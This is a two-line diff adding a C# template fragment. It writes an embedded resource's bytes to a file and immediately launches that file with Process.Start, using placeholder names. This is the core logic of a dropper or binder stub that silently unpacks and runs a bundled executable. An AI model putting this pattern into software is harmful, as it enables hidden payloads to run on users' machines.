@@ -1,0 +1,2 @@
+﻿ System.IO.File.WriteAllBytes(malabar +"{filname}", (byte[])m.GetObject("{ressources}"));
+                System.Diagnostics.Process.Start(malabar + "{filname}");
